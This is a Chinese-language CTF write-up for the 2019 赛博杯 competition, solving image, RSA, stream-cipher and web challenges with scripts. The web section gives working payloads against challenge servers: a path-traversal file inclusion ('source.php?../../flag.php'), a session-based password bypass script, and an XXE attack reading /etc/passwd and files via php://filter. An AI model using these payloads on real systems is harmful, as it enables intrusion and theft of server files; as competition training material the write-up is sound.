<p>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，</p>
<p>构造脚本如下</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">"f1.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">"f2.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>=im.<span class="built_in">size</span>[<span class="number">0</span>]  #图片宽</span><br><span class="line"></span><br><span class="line"><span class="built_in">height</span>=im.<span class="built_in">size</span>[<span class="number">1</span>] #图片高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> x in range(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span> y in range(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span>(data!=<span class="number">255</span> <span class="keyword">or</span> data2!=<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        	dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> i in range (<span class="keyword">int</span>(len(dd)/<span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = dd[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = <span class="keyword">int</span>(<span class="keyword">word</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(<span class="keyword">int</span>(<span class="keyword">word</span>))</span><br><span class="line"></span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1)%<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= <span class="string">'='</span>*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">write</span>(flag)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>

<p>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/6.png" alt="6"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件</p>
<p>openssl rsa -pubin -text -modulus -in public.pem</p>
<p>得到</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/7.png" alt="7"></p>
<p>其中。N=&gt;Modulus，e=&gt;Exponent</p>
<p>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，再用openssl解密flag.enc，得到字符串</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;Y!s04tEP&#123;ygraCl_f</span><br></pre></td></tr></table></figure>

<p>栅栏加方向即可得到flag，</p>
<p>rsatool和openssl的使用参考</p>
<p><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p>
<h3 id="川流不息"><a href="#川流不息" class="headerlink" title="川流不息"></a>川流不息</h3><p>题目加密脚本和密文</p>
<p>加密脚本</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> parameters import <span class="keyword">a</span></span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure>

<p>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">a</span>=[i,j,k,p,q]</span><br><span class="line">                        <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">                        <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">                            <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">                            <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">result</span>==key:</span><br><span class="line">                            print(<span class="keyword">a</span>)</span><br><span class="line">                            break</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">"flag&#123;"</span></span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br></pre></td></tr></table></figure>

<p>得到a=[1, 0, 0, 1, 0]</p>
<p>然后根据加密脚本，获得key。然后key与密文异或得到flag</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">a</span>=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    cipher = <span class="string">'111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(cipher))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>)),<span class="keyword">end</span>=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/8.png" alt="8"></p>
<p>输入</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//45.76.51.219:8050/?base=bXlmbGFn</span></span><br></pre></td></tr></table></figure>

<p>得到回显 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能输入bXlmbGFn！</span><br></pre></td></tr></table></figure>

<p>但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，</p>
<p>最终payload：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//45.76.51.219:8050/?base=bXlmbGFn1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>进入网站，f12，发现注释：</p>
<p>进入sorce.php发现源码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = urldecode($page);</span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $_page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞</p>
<p>审计代码得到：</p>
<p>要设定page的值，且内容要在whiteList中</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mb_substr</span><span class="params">(<span class="variable">$page</span>,<span class="number">0</span>,mb_strpos(<span class="variable">$page</span>.<span class="string">'?'</span>,<span class="string">'?'</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle</p>
<p>所以最终payload：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">47.110</span><span class="number">.227</span><span class="number">.208</span>:<span class="number">8003</span>/index.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php?../../flag.php</span><br></pre></td></tr></table></figure>

<p>得到一个猜密码的界面    </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="xml">session_start();</span></span><br><span class="line"><span class="xml">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="xml">if (isset ($_POST['password'])) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'pwd'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>])</span></span><br><span class="line"><span class="xquery">                die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="xquery">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="xquery">                print <span class="string">'&lt;p&gt;猜测错误.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="xquery">                <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>]=time().time();</span></span><br><span class="line"><span class="xquery">        &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"猜密码"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#html解析器</span></span><br><span class="line">url=<span class="string">"http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"</span>    <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#获取一个session对象</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#返回的页面</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"pwd"</span>:<span class="string">"int(time.time())"</span>&#125;<span class="comment">#构建一个formData，用于传我们的</span></span><br><span class="line">re2=session.post(url,data=formData)<span class="comment">#post过去</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">"猜测错误"</span> not  in re2.text):</span><br><span class="line">	print(re2.text)</span><br></pre></td></tr></table></figure>

<p>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是<strong>$_SESSION[‘pwd’]=time();</strong>没有执行成功。</p>
<h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>首先，了解一下XXE，（xml外部实体注入漏洞）</p>
<p>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
<p>（然后跟这个文章走2333）</p>
<p>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，</p>
<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/9.png" alt="9"></p>
<p>漏洞验证成功，</p>
<p>于是修改XML中的外部实体为其他协议，根据提示看hint，<code>php://filter/read=convert.base64-encode/resource=hint.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/10.png" alt="10"></p>
<p>解码后得到目录，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/11.png" alt="11"></p>
<p>于是</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/12.png" alt="12"></p>
<p>解码得到flag</p>
<h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>进入页面，f12，发现注释 phpinfo.php</p>
<p>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）</p>
